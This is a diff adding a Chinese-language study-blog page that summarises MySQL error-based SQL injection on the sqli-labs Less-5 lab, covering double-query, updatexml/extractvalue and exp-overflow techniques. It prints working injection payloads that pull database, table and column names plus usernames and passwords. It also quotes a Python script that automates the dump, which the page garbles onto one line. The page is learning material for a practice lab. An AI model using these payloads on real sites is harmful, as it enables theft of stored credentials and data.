@@ -1,0 +1,735 @@
+<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>mysql注入一些点的总结 | Pale</title><meta name="keywords" content="学习笔记"><meta name="author" content="One"><meta name="copyright" content="One"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="常见函数sql注入过程中需要用到一些函数来完成测试过程。  mid()函数mid(column_name,start[,length])这个函数作用是从指定字段中提取出字段的内容。column_name：字段名start：开始位置length:长度例子：      limit() 返回结果中的前几条数据或者中间的数据 1SELECT * FROM TABLE LIMIT M,N;  m是指记录开始">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql注入一些点的总结">
+<meta property="og:url" content="http://example.com/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Pale">
+<meta property="og:description" content="常见函数sql注入过程中需要用到一些函数来完成测试过程。  mid()函数mid(column_name,start[,length])这个函数作用是从指定字段中提取出字段的内容。column_name：字段名start：开始位置length:长度例子：      limit() 返回结果中的前几条数据或者中间的数据 1SELECT * FROM TABLE LIMIT M,N;  m是指记录开始">
+<meta property="og:locale" content="zh_CH">
+<meta property="og:image" content="http://example.com/imgg/10.jpeg">
+<meta property="article:published_time" content="2022-01-06T02:06:53.000Z">
+<meta property="article:modified_time" content="2022-01-06T02:54:07.174Z">
+<meta property="article:author" content="One">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgg/10.jpeg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'mysql注入一些点的总结',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2022-01-06 10:54:07'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/sup.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pale" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/imgg/10.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Pale</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">mysql注入一些点的总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-01-06T02:06:53.000Z" title="Created 2022-01-06 10:06:53">2022-01-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-01-06T02:54:07.174Z" title="Updated 2022-01-06 10:54:07">2022-01-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="mysql注入一些点的总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><p>sql注入过程中需要用到一些函数来完成测试过程。</p>
+<ul>
+<li>mid()函数<br><code>mid(column_name,start[,length])</code><br>这个函数作用是从指定字段中提取出字段的内容。<br><code>column_name：</code>字段名<br><code>start：</code>开始位置<br><code>length:</code>长度<br>例子：</li>
+</ul>
+<p><img src="webp.webp" alt="img"></p>
+<p><img src="webp-16414367160921.webp" alt="img"></p>
+<p><img src="webp-16414367160922.webp" alt="img"></p>
+<ul>
+<li><p>limit()</p>
+<p>返回结果中的前几条数据或者中间的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM TABLE LIMIT M,N;</span><br></pre></td></tr></table></figure>
+
+<p>m是指记录开始的index，从0开始，表示第一条记录。</p>
+<p>n是指从第m+1条开始，取n条。</p>
+<p><img src="webp-16414367160923.webp" alt="img"></p>
+</li>
+<li><p>concat()、concat_ws()、group_concat()<br>concat()函数可以连接一个或者多个字符串<br><code>concat(str1,str2,str3,....)</code><br>返回结果为连接参数产生的字符串，但是如果其中一个参数为NULL ，则返回值为 NULL。</p>
+</li>
+</ul>
+<p><img src="webp-16414367160924.webp" alt="img"><br>concat_ws()<br><code>concat_ws()(separator,str1,str2,...)</code><br>第一个参数是分隔符，</p>
+<p><img src="webp-16414367160935.webp" alt="img"><br>group_concat()<br>分组拼接函数<br><code>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator &#39;分隔符&#39;])</code></p>
+<p><img src="webp-16414367160936.webp" alt="img"></p>
+<ul>
+<li><p>Count() 聚集函数，统计元祖个数</p>
+<p><img src="webp-16414367160937.webp" alt="img"></p>
+</li>
+<li><p>rand() 产生一个0~1的随机数</p>
+</li>
+</ul>
+<p><img src="webp-16414367160938.webp" alt="img"></p>
+<ul>
+<li><p>floor() 向下取整</p>
+<p><img src="webp-16414367160939.webp" alt="img"></p>
+</li>
+<li><p>group by 根据想要的规则对结果进行分组</p>
+</li>
+</ul>
+<p><img src="webp-164143671609310.webp" alt="img"></p>
+<ul>
+<li>Substr() 截取字符串<br><code>substr(a,b,c)</code><br>a 所要截取字符串<br>b 截取的位置<br>c 截取的长度</li>
+</ul>
+<p><img src="webp-164143671609311.webp" alt="img"></p>
+<ul>
+<li>Ascii() 返回字符串的ascii码</li>
+</ul>
+<p><img src="webp-164143671609312.webp" alt="img"></p>
+<ul>
+<li>Left()函数<br><code>left(string,num)</code> 得到字符串最左边指定个数的字符</li>
+</ul>
+<p><img src="webp-164143671609313.webp" alt="img"></p>
+<p><img src="webp-164143671609314.webp" alt="img"></p>
+<ul>
+<li>ORD()函数，此函数为返回第一个字符的ASCII码，可以和上面的函数进行组合使用。<br><code>ORD(MID(DATABASE(),1,1))&gt;119</code> –&gt;检测database()的第一位ASCII码是否大于119，也即是‘r’</li>
+</ul>
+<p><img src="webp-164143671609315.webp" alt="img"></p>
+<p><img src="%7Bwebp-164143671609416.webp" alt="img"></p>
+<p>这两种方法都可以把数据库的名字猜出来。</p>
+<h1 id="报错。"><a href="#报错。" class="headerlink" title="报错。"></a>报错。</h1><p>双查询注入</p>
+<p><strong>什么是双查询注入呢？</strong></p>
+<p>看大佬的解释太深奥，粗俗的理解就是一个select语句里再嵌套一个select语句，将有用的信息显示在SQL的报错信息。</p>
+<p>首先,理解四个函数/语句：<strong>Concat(),Rand(), Floor(), Count(),Group by clause</strong></p>
+<p>①concat()函数</p>
+<p>我理解为组合，汇合函数将括号里的符号连接在一起。</p>
+<p><img src="a8986c9be71521c07ed04b31cae2f5c6.png" alt="a8986c9be71521c07ed04b31cae2f5c6.png"></p>
+<p>将结果连在了一起。</p>
+<p><img src="4cbac94e27d91bb14ab00cec939a7d82.png" alt="4cbac94e27d91bb14ab00cec939a7d82.png"></p>
+<p>②Rand函数</p>
+<p>用来返回一个01之间的随机数，区间表示就是【0,1)。括号里为空时，随机产生数。</p>
+<p><img src="9ceb6271323ae3ede1ad262f4c4b57a9.png" alt="9ceb6271323ae3ede1ad262f4c4b57a9.png"></p>
+<p>当括号里的参数固定时，随机数(随机数列)也是固定的。</p>
+<p><img src="dee6f116a60b0803b24e2428f55c2cd8.png" alt="dee6f116a60b0803b24e2428f55c2cd8.png"></p>
+<p>让我们看一下随机数列</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">rand</span>(<span class="params"><span class="number">3</span></span>) <span class="keyword">from</span> information_schema.columns limit 3</span>;</span><br></pre></td></tr></table></figure>
+
+<p>产生三列随机数。</p>
+<p><img src="1cb4d441fbacdd8b7490262073eeb572.png" alt="1cb4d441fbacdd8b7490262073eeb572.png"></p>
+<p>对比一下还是不变。</p>
+<p>③Floor()函数</p>
+<p>Floor()函数时取整函数，当输入一个非整数，返回小于等于输入参数的最大整数。</p>
+<p><img src="9af296b7db716c4d8e85d1a61fa92c3a.png" alt="9af296b7db716c4d8e85d1a61fa92c3a.png"></p>
+<p>④count()函数</p>
+<p>用于统计行数。</p>
+<p><img src="5f47fef24e85130e6333b85ec103fb02.png" alt="5f47fef24e85130e6333b85ec103fb02.png"></p>
+<p>⑤group by 语句</p>
+<p>先看这句：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema, table_name <span class="keyword">from</span> information_schema.tables；</span><br></pre></td></tr></table></figure>
+
+<p><img src="077b7ec7cac8262ea9f028f9df5f5a7a.png" alt="077b7ec7cac8262ea9f028f9df5f5a7a.png"></p>
+<p>加上group by语句后：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema, table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">by</span> table_schema；</span><br></pre></td></tr></table></figure>
+
+<p><img src="6c02cf042dafa816aaa6dfcf84be040f.png" alt="6c02cf042dafa816aaa6dfcf84be040f.png"></p>
+<p>加上之后，数据明显少了很多的重复的。重复的数据库只显示一个，并且只显示数据库里的第一张表。</p>
+<p>几个函数灵活运用，会有什么不异想不到的结果呢？</p>
+<p>我们实践一下</p>
+<p>①rand()函数和floor()函数结合使用。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">floor</span>(<span class="params">rand(<span class="number">5</span></span>)*12) <span class="keyword">from</span> information_schema.columns limit 5</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="10a41ecde27375f4a254ce8a6817381e.png" alt="10a41ecde27375f4a254ce8a6817381e.png"></p>
+<p>由内到外逐个分析，rand(5)会随机产生5个不同的值，但是*12，就是将【0，1)扩大到【0，12)，floor函数就是取整了。</p>
+<p>②count()函数和group by语句</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema, count(*) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> table_schema;</span><br></pre></td></tr></table></figure>
+
+<p><img src="1290d0d11e360a9478b2013628c51cbb.png" alt="1290d0d11e360a9478b2013628c51cbb.png"></p>
+<p>他们的组合就是统计了每个数据库里有多少张表。</p>
+<p>其原理就是：Mysql会建立一张临时表，有group_key和tally两个字段，其中group_key设置了UNIQUE约束，即不能有两行的group_key列的值相同。使用group by语句和count()函数的时候，mysql数据库会先建立一个虚拟表，当查询到新的键不在虚拟表中，数据库就会将其插入表中，如果数据库中已存在该键，则找到该键对应的计数字段并加1。</p>
+<p>③双查询的核心语句(几个函数综合使用)</p>
+<p>先看payload：<strong>select floor(rand(14)*2) c, count(*) from information_schema.columns group by c;</strong></p>
+<p><img src="2cb3904b80a2bf573ed928f48bce400d.png" alt="2cb3904b80a2bf573ed928f48bce400d.png"></p>
+<p>报错了，那为什么会报错？ 分析一下： SQL语句中用列c分组，而列c是floor(rand(14)2)的别名。 floor(rand(14)2)产生的随机数列，前四位是：1，0，1，0。</p>
+<p>我们查询的时候，mysql数据库会先建立一个临时表，设置了UNIQUE约束的group_key和tally两个字段。当查询到新的”group_key键”不在临时表中，数据库就会将其插入临时表中，如果数据库中已存在group_key该键，则找到该键对应的”tally计数”字段并加1。</p>
+<p>创建好临时表后，Mysql开始逐行扫描information_schema.columns表，遇到的第一个分组列是floor(rand(14)2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)2)，注意此时又计算了一次，结果为0。所以实际插入到临时表的一行group_key为0，tally为1，临时表变成了：</p>
+<p><img src="939d936eb5fd3ce6ec49271d8b0cdad7.png" alt="939d936eb5fd3ce6ec49271d8b0cdad7.png"></p>
+<p>Mysql继续扫描information_schema.columns表，遇到的第二个分组列还是floor(rand(14)2)，计算出其值为1(这个1是随机数列的第三个数)，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)2)，此时又计算了一次，结果为0(这个0是随机数列的第四个数)，所以尝试向临时表插入一行数据，group_key为0，tally为1。但实际上临时表中已经有一行的group_key为0，而group_key又设置了不可重复的约束，所以就会出现报错。</p>
+<p>知道了原理，就实战一下。以sql-lib/Less-5为例：</p>
+<p>判断闭合点：</p>
+<p><img src="59e073bf797be48b5ff6fe69aad8d8ea.png" alt="59e073bf797be48b5ff6fe69aad8d8ea.png"></p>
+<p>然后查询数据库： 构建payload:<strong>?id=-1’ union select 1,count(*),concat( (select database()),floor(rand()*2)) as a from information_schema.tables group by a –+</strong></p>
+<p><img src="4f0d2f67fef730563cc02900143049ff.png" alt="4f0d2f67fef730563cc02900143049ff.png"></p>
+<p>数据库就在报错的信息里显示出来了。</p>
+<p>但是，因为是随机值，所以只会有50%的概率会报错。</p>
+<p><img src="91467023fdd0d5dd6ce63759f8052cfe.png" alt="91467023fdd0d5dd6ce63759f8052cfe.png"></p>
+<p>相同的payload但显示正常。</p>
+<p>有大佬说，可以通过修改rand()使用的种子来使其百分百报错,如下将rand()改为rand(1)，测试百分之百报错，即payload：**?id=-1’ union select 1,count(*),concat( (select database()),floor(rand(1)*2)) as a from information_schema.tables group by a –+**</p>
+<p><img src="4eeaae83bfcaf350da69a24bd8de949c.png" alt="4eeaae83bfcaf350da69a24bd8de949c.png"></p>
+<p>但我发现，rand(1)并不会100%报错，反而我是试了几次都没有报错，只有4，11，14，15这几个数会100%报错，我也不知道什么原因，在这里留个悬念，希望大佬能解释一下。</p>
+<p>我们来爆表,前面我们知道了当前数据库的为security，构造payload：**?id=-1’ union select 1,count(*),concat( (select table_name from information_schema.tables where table_schema=’security’ limit 3,1),floor(rand(4)*2)) as a from information_schema.columns group by a –+**</p>
+<p><img src="d6eeb17c91a9046185ea1281351de813.png" alt="d6eeb17c91a9046185ea1281351de813.png"></p>
+<p>总共四张表，我们在第三张拿到了我们想要的。</p>
+<p>知道了表名，看列值，构造payload：**?id=-1’ union select 1,count(*),concat( (select column_name from information_schema.columns where table_name=’users’ limit 4,1),floor(rand(4)*2)) as a from information_schema.columns group by a –+**</p>
+<p>我通过修改limit X,1里X的值，在3，1的时候看到了password字段</p>
+<p><img src="979e12860cff99de5f356784316ce477.png" alt="979e12860cff99de5f356784316ce477.png"></p>
+<p>在9，1的时候得到了用户名字段</p>
+<p><img src="dbca3f53b9685c2ce7fc108929f9124b.png" alt="dbca3f53b9685c2ce7fc108929f9124b.png"></p>
+<p>开始拿用户名和密码，构造payload：**?id=-1’ union select 1,count(*),concat( (select username from users limit 0,1),floor(rand(4)*2)) as a from information_schema.columns group by a –+**</p>
+<p><img src="6fbb3ca84a8bbb30b0cbbad02afbd2b0.png" alt="6fbb3ca84a8bbb30b0cbbad02afbd2b0.png"></p>
+<p>和**?id=-1’ union select 1,count(*),concat( (select password from users limit 0,1),floor(rand(4)*2)) as a from information_schema.columns group by a –+**</p>
+<p><img src="69a10577a8e04f5df50845982bd82f15.png" alt="69a10577a8e04f5df50845982bd82f15.png"></p>
+<p>这里要注意用户名和密码的列数应改相对。</p>
+<p>是不是jio着麻烦，附上Mochaaz大佬的python代码</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsfrom bs4 <span class="keyword">import</span> BeautifulSoupdb_name = <span class="string">&#x27;&#x27;</span>table_list = []column_list = []url = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;http://192.168.1.158/sqlilabs/Less-5/?id=1&#x27;</span><span class="string">&#x27;&#x27;</span>### 获取当前数据库名 ###<span class="built_in">print</span>(<span class="string">&#x27;当前数据库名:&#x27;</span>)payload = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> and <span class="number">1</span>=(<span class="keyword">select</span> count(*) from information_schema.columns group by concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> database()),<span class="number">0x3a</span>,floor(rand(<span class="number">0</span>)*<span class="number">2</span>)))--+<span class="string">&#x27;&#x27;</span><span class="string">&#x27;r = requests.get(url+payload)db_name = r.text.split(&#x27;</span>:<span class="string">&#x27;)[-2]print(&#x27;</span>[+]<span class="string">&#x27; + db_name)### 获取表名 ###print(&#x27;</span>数据库%s下的表名:<span class="string">&#x27; % db_name)for i in range(50):payload = &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema=&#x27;</span>%s<span class="string">&#x27; limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;</span><span class="string">&#x27;&#x27;</span> % (db_name,i)r = requests.get(url+payload)<span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> not in r.text:breaktable_name = r.text.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">-2</span>]table_list.<span class="built_in">append</span>(table_name)<span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + table_name)### 获取列名 ####### 这里以users表为例 ####<span class="built_in">print</span>(<span class="string">&#x27;%s表下的列名:&#x27;</span> % table_list[<span class="number">-1</span>])<span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="number">50</span>):payload = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> and <span class="number">1</span>=(<span class="keyword">select</span> count(*) from information_schema.columns group by concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> column_name from information_schema.columns where table_name=<span class="string">&#x27;%s&#x27;</span> limit %d,<span class="number">1</span>),<span class="number">0x3a</span>,floor(rand(<span class="number">0</span>)*<span class="number">2</span>)))--+<span class="string">&#x27;&#x27;</span><span class="string">&#x27; % (table_list[-1],i)r = requests.get(url + payload)if &#x27;</span>group_key<span class="string">&#x27; not in r.text:breakcolumn_name = r.text.split(&#x27;</span>:<span class="string">&#x27;)[-2]column_list.append(column_name)print(&#x27;</span>[+]<span class="string">&#x27; + column_name)### 获取字段值 ####### 这里以username列为例 ####print(&#x27;</span>%s列下的字段值:<span class="string">&#x27; % column_list[-2])for i in range(50):payload = &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;</span><span class="string">&#x27;&#x27;</span> % (column_list[<span class="number">-2</span>],db_name,table_list[<span class="number">-1</span>],i)r = requests.get(url + payload)<span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> not in r.text:breakdump = r.text.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">-2</span>]<span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + dump)</span><br></pre></td></tr></table></figure>
+
+<p>花费几小时的注入，代码几秒就出来结果了。</p>
+<p><img src="4175b0d777306d3061a07f5f82455310.png" alt="4175b0d777306d3061a07f5f82455310.png"></p>
+<p>用户名直接出来了，我要好好学python了，啥都不会。我们可以开始注入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; union select 1,count(*),concat((select database()),floor(rand()*2))a from information_schema.columns group by a -- -</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center.png" alt="在这里插入图片描述"><br>可以知道数据库名是security。<br>然后获取表名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; union select 1,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),floor(rand()*2))a from information_schema.columns group by a -- -</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center-164143712726634.png" alt="在这里插入图片描述"><br>然后就是字段和查询列：<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center-164143712726735.png" alt="在这里插入图片描述"><br>就可以了。</p>
+<p>Xpath报错注入</p>
+<p>xpath报错注入可以使用的函数我知道的有两个，分别是：updatexml(),extractvalue()。<br>updatexml报错注入的用法如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>extractvalue的用法如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select database()),0x7e))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center-164143712726736.png" alt="在这里插入图片描述"></p>
+<p>之后extractvalue的注入方式就和平常的注入一样了。<br>同理updatexml也是这样注入。</p>
+<p>利用double 数值类型超出范围进行报错注入</p>
+<p>具体可以参考：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/articles/5509124.html">使用exp进行SQL报错注入
+</a></p>
+<p>注入方式如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>只不过在这题，它并不会回显真正的user()，但是上面的文章里面有回显，可能是因为一些玄学原因吧，作为一个知识点了解了解。</p>
+<p>利用bigint 溢出进行报错注入</p>
